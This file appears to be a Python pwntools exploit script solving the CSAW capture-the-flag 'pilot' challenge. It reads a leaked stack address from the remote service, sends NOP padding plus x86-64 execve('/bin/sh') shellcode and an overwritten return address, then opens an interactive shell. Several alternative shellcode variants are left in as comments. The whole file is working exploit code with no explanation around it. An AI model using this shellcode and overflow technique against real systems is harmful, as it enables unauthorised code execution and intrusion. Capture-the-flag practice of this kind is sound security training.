from pwn import *
import struct
p = remote('pwn.chal.csaw.io',8464)
#p = process('./pilot')
#gdb.attach(p,"""
#b *0x400b35
#""")
print p.recvuntil("Location:")
addr = p.recvuntil("\n").replace("\n","")
addr_n = int(addr,16)
addr_str = struct.pack("<Q",addr_n)

shellcode = "\x31\xf6\x48\xbf\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdf\xf7\xe6\x04\x3b\x57\x54\x5f\x0f\x05"
#shellcode = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"
#shellcode = '\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'
#shellcode = "\x48\xb9\x2f\x62\x69\x6e\x2f\x73\x68\x11\x48\xc1\xe1\x08\x48\xc1\xe9\x08\x51\x48\x8d\x3c\x24\x48\x31\xd2\xb0\x3b\x0f\x05"
#shellcode = "\x48\x31\xd2\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05"
 
noops = "\x90" * 4
#shellcode = shellcode[::-1]
shellcode += (40 -len(noops)- len(shellcode)) * 'a'


rop_str = noops + shellcode
#i=0
#while i < (len(shellcode) - 8):
#    s = shellcode[i:i+8]
#    rop_str += s[::-1]
#    i += 8
#    pass
    
rop_str += addr_str
print addr
print addr_str
print shellcode
p.sendline(rop_str)
p.interactive()

